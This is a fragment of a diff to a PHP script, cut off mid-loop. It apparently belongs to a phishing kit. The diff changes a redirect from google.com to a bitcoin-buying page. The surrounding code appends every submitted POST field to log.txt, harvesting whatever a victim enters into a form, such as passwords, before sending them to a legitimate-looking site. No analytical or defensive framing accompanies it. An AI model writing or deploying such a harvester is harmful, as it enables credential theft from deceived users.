@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://www.google.com');
+header ('Location: https://bitcoin.org/en/buy');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
